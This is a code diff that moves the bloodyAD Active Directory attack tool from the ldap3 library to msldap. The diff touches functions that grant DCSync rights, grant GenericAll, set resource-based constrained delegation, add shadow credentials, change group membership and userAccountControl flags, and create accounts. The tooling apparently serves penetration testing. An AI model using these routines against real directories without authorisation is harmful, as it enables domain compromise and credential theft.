@@ -3,7 +3,8 @@ from typing import Literal
 from bloodyAD import utils
 from bloodyAD.utils import LOG
 from bloodyAD.formatters import accesscontrol, common, cryptography, dns
-import ldap3
+from bloodyAD.network.ldap import Change, Scope
+import msldap
 from cryptography import x509
 from cryptography.x509.oid import NameOID
 from cryptography.hazmat.primitives import hashes, serialization
@@ -23,7 +24,7 @@ def computer(conn, hostname: str, newpass: str, ou: str = "DefaultOU"):
     if ou == "DefaultOU":
         container = None
         for obj in next(
-            conn.ldap.bloodysearch(conn.ldap.domainNC, attr="wellKnownObjects")
+            conn.ldap.bloodysearch(conn.ldap.domainNC, attr=["wellKnownObjects"])
         )["wellKnownObjects"]:
             if "GUID_COMPUTERS_CONTAINER_W" == obj.binary_value:
                 container = obj.dn
@@ -57,7 +58,7 @@ def computer(conn, hostname: str, newpass: str, ou: str = "DefaultOU"):
         "userAccountControl": 0x1000,
         "servicePrincipalName": spns,
         "sAMAccountName": f"{hostname}$",
-        "unicodePwd": ('"%s"' % newpass).encode("utf-16-le"),
+        "unicodePwd": '"%s"' % newpass,
     }
 
     conn.ldap.bloodyadd(computer_dn, attributes=attr)
@@ -74,18 +75,20 @@ def dcsync(conn, trustee: str):
     if "s-1-" in trustee.lower():
         trustee_sid = trustee
     else:
-        trustee_sid = next(conn.ldap.bloodysearch(trustee, attr="objectSid"))[
+        trustee_sid = next(conn.ldap.bloodysearch(trustee, attr=["objectSid"]))[
             "objectSid"
         ]
     access_mask = accesscontrol.ACCESS_FLAGS["ADS_RIGHT_DS_CONTROL_ACCESS"]
     utils.addRight(new_sd, trustee_sid, access_mask)
 
-    controls = ldap3.protocol.microsoft.security_descriptor_control(
-        sdflags=accesscontrol.DACL_SECURITY_INFORMATION
-    )
+    req_flags = msldap.wintypes.asn1.sdflagsrequest.SDFlagsRequestValue({
+        "Flags": accesscontrol.DACL_SECURITY_INFORMATION
+    })
+    controls = [("1.2.840.113556.1.4.801", True, req_flags.dump())]
+
     conn.ldap.bloodymodify(
         conn.ldap.domainNC,
-        {"nTSecurityDescriptor": [ldap3.MODIFY_REPLACE, new_sd.getData()]},
+        {"nTSecurityDescriptor": [(Change.REPLACE.value, new_sd.getData())]},
         controls,
     )
 
@@ -151,7 +154,7 @@ def dnsRecord(
     for entry in conn.ldap.bloodysearch(
         zone_dn,
         ldap_filter=ldap_filter,
-        search_scope=ldap3.SUBTREE,
+        search_scope=Scope.SUBTREE,
         attr=["name", "dnsRecord"],
         raw=True,
     ):
@@ -162,7 +165,7 @@ def dnsRecord(
                     serial = dns_record["Data"]["SerialNo"]
                     break
         else:
-            record_dn = entry["distinguishedName"].decode()
+            record_dn = entry["distinguishedName"]
             new_dnsrecord_list = entry["dnsRecord"]
 
     if not serial:
@@ -186,7 +189,7 @@ def dnsRecord(
     new_dnsrecord_list.append(new_dnsrecord.getData())
     print(new_dnsrecord_list)
     conn.ldap.bloodymodify(
-        record_dn, {"dnsRecord": [ldap3.MODIFY_REPLACE, new_dnsrecord_list]}
+        record_dn, {"dnsRecord": [(Change.REPLACE.value, new_dnsrecord_list)]}
     )
     LOG.info(f"[+] {name} has been successfully updated")
 
@@ -202,17 +205,19 @@ def genericAll(conn, target: str, trustee: str):
     if "s-1-" in trustee.lower():
         trustee_sid = trustee
     else:
-        trustee_sid = next(conn.ldap.bloodysearch(trustee, attr="objectSid"))[
+        trustee_sid = next(conn.ldap.bloodysearch(trustee, attr=["objectSid"]))[
             "objectSid"
         ]
     utils.addRight(new_sd, trustee_sid)
 
-    controls = ldap3.protocol.microsoft.security_descriptor_control(
-        sdflags=accesscontrol.DACL_SECURITY_INFORMATION
-    )
+    req_flags = msldap.wintypes.asn1.sdflagsrequest.SDFlagsRequestValue({
+        "Flags": accesscontrol.DACL_SECURITY_INFORMATION
+    })
+    controls = [("1.2.840.113556.1.4.801", True, req_flags.dump())]
+
     conn.ldap.bloodymodify(
         target,
-        {"nTSecurityDescriptor": [ldap3.MODIFY_REPLACE, new_sd.getData()]},
+        {"nTSecurityDescriptor": [(Change.REPLACE.value, new_sd.getData())]},
         controls,
     )
 
@@ -236,7 +241,7 @@ def groupMember(conn, group: str, member: str):
     else:
         member_transformed = conn.ldap.dnResolver(member)
 
-    conn.ldap.bloodymodify(group, {"member": (ldap3.MODIFY_ADD, member_transformed)})
+    conn.ldap.bloodymodify(group, {"member": [(Change.ADD.value, member_transformed)]})
     LOG.info(f"[+] {member} added to {group}")
 
 
@@ -254,7 +259,7 @@ def rbcd(conn, target: str, service: str):
     if "s-1-" in service.lower():
         service_sid = service
     else:
-        service_sid = next(conn.ldap.bloodysearch(service, attr="objectSid"))[
+        service_sid = next(conn.ldap.bloodysearch(service, attr=["objectSid"]))[
             "objectSid"
         ]
     access_mask = accesscontrol.ACCESS_FLAGS["ADS_RIGHT_DS_CONTROL_ACCESS"]
@@ -264,8 +269,10 @@ def rbcd(conn, target: str, service: str):
         target,
         {
             "msDS-AllowedToActOnBehalfOfOtherIdentity": [
-                ldap3.MODIFY_REPLACE,
-                new_sd.getData(),
+                (
+                    Change.REPLACE.value,
+                    new_sd.getData(),
+                )
             ]
         },
     )
@@ -318,7 +325,7 @@ def shadowCredentials(conn, target: str, path: str = "CurrentPath"):
     key_dnbinary.fromCanonical(keyCredential.getData(), target_dn)
     conn.ldap.bloodymodify(
         target_dn,
-        {"msDS-KeyCredentialLink": [ldap3.MODIFY_ADD, str(key_dnbinary)]},
+        {"msDS-KeyCredentialLink": [(Change.ADD.value, str(key_dnbinary))]},
     )
 
     LOG.debug("[+] msDS-KeyCredentialLink attribute of the target object updated")
@@ -382,10 +389,10 @@ def uac(conn, target: str, f: list = None):
 
     try:
         old_uac = next(
-            conn.ldap.bloodysearch(target, attr="userAccountControl", raw=True)
+            conn.ldap.bloodysearch(target, attr=["userAccountControl"], raw=True)
         )["userAccountControl"][0]
     except IndexError as e:
-        for allowed in next(conn.ldap.bloodysearch(target, attr="allowedAttributes"))[
+        for allowed in next(conn.ldap.bloodysearch(target, attr=["allowedAttributes"]))[
             "allowedAttributes"
         ]:
             if "userAccountControl" in allowed:
@@ -395,7 +402,9 @@ def uac(conn, target: str, f: list = None):
                 ) from e
         raise BloodyError(f"{target} doesn't have userAccountControl attribute") from e
     uac |= int(old_uac)
-    conn.ldap.bloodymodify(target, {"userAccountControl": [ldap3.MODIFY_REPLACE, uac]})
+    conn.ldap.bloodymodify(
+        target, {"userAccountControl": [(Change.REPLACE.value, uac)]}
+    )
 
     LOG.info(f"[-] {f} property flags added to {target}'s userAccountControl")
 
@@ -411,7 +420,7 @@ def user(conn, sAMAccountName: str, newpass: str, ou: str = "DefaultOU"):
     if ou == "DefaultOU":
         container = None
         for obj in next(
-            conn.ldap.bloodysearch(conn.ldap.domainNC, attr="wellKnownObjects")
+            conn.ldap.bloodysearch(conn.ldap.domainNC, attr=["wellKnownObjects"])
         )["wellKnownObjects"]:
             if "GUID_USERS_CONTAINER_W" == obj.binary_value:
                 container = obj.dn
@@ -431,7 +440,7 @@ def user(conn, sAMAccountName: str, newpass: str, ou: str = "DefaultOU"):
         "distinguishedName": user_dn,
         "sAMAccountName": sAMAccountName,
         "userAccountControl": 544,
-        "unicodePwd": ('"%s"' % newpass).encode("utf-16-le"),
+        "unicodePwd": '"%s"' % newpass,
     }
 
     conn.ldap.bloodyadd(user_dn, attributes=attr)
